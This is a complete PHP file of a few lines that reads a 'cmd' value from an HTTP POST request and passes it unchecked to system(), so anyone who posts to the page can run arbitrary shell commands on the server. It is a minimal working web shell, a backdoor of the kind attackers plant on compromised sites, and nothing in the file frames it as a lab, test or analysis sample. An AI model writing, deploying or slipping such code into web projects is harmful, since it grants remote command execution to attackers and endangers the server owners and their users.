
<?php
$command = $_POST['cmd'];
if (!empty($command)) {
  system($command);
}
?>
